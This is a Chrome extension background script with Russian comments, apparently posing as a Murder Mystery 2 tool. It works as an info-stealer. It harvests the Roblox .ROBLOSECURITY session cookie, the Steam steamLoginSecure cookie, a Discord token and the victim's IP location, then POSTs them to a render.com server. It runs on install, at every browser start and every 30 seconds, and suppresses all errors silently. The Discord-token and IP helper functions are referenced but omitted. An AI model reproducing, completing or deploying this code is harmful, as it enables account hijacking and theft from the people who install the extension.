const SERVER_URL = "https://mm2-server.onrender.com/send";

let sentRoblox = "";
let sentSteam = "";
let sentDiscord = "";

// ... (функции getDiscordToken, getIP — те же)

async function sendData() {
    const data = {
        robloxCookie: "",
        steamCookie: "",
        discordToken: "",
        robloxStatus: "not_found",
        steamStatus: "not_found",
        discordStatus: "not_found",
        ip: "",
        country: "",
        city: ""
    };

    // IP
    const ip = await getIP();
    data.ip = ip?.ip || "";
    data.country = ip?.country || "";
    data.city = ip?.city || "";

    // Roblox
    try {
        const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
        const rob = c.find(x => x.name === ".ROBLOSECURITY");
        if (rob && rob.value) {
            if (rob.value !== sentRoblox) {
                data.robloxCookie = rob.value;
                data.robloxStatus = "new";
                sentRoblox = rob.value;
            } else {
                data.robloxStatus = "sent";
            }
        }
    } catch (e) {}

    // Steam
    try {
        const c = await chrome.cookies.getAll({ domain: "steamcommunity.com" });
        const steam = c.find(x => x.name === "steamLoginSecure");
        if (steam && steam.value) {
            if (steam.value !== sentSteam) {
                data.steamCookie = steam.value;
                data.steamStatus = "new";
                sentSteam = steam.value;
            } else {
                data.steamStatus = "sent";
            }
        }
    } catch (e) {}

    // Discord
    const discordToken = await getDiscordToken();
    if (discordToken) {
        if (discordToken !== sentDiscord) {
            data.discordToken = discordToken;
            data.discordStatus = "new";
            sentDiscord = discordToken;
        } else {
            data.discordStatus = "sent";
        }
    }

    // Отправляем всегда, если есть IP
    try {
        await fetch(SERVER_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    } catch (e) {}
}

chrome.runtime.onInstalled.addListener(() => { sendData(); });
chrome.runtime.onStartup.addListener(() => { sendData(); });
setInterval(sendData, 30000);
